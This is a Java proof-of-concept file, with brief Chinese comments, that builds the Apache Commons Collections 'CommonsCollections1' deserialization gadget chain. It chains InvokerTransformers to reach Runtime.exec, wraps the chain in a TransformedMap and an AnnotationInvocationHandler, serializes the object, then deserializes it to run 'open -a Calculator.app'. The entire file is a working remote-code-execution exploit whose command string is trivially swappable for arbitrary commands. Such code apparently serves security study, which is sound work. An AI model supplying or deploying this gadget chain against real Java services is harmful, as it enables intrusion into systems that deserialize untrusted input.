import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.annotation.Generated;

public class CommonsCollections1_1 {
    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        Map hashMap = new HashMap<>();

        hashMap.put("comments",2);

        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",null}
                ),//获取getRuntime方法
                new InvokerTransformer("invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null,null}
                ),//获取Runtime对象
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"open -a Calculator.app"}
                )//执行命令
        });

        //当值发生变化会进行transformer
        Map transformedMap = TransformedMap.decorate(hashMap,null,chain);
        Class<?> cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

        Constructor<?> constructor = cl.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Generated.class,transformedMap);

        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("CommonsCollections1.1.bin"));
        objectOutputStream.writeObject(handler);

        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("CommonsCollections1.1.bin"));
        objectInputStream.readObject();

    }
}
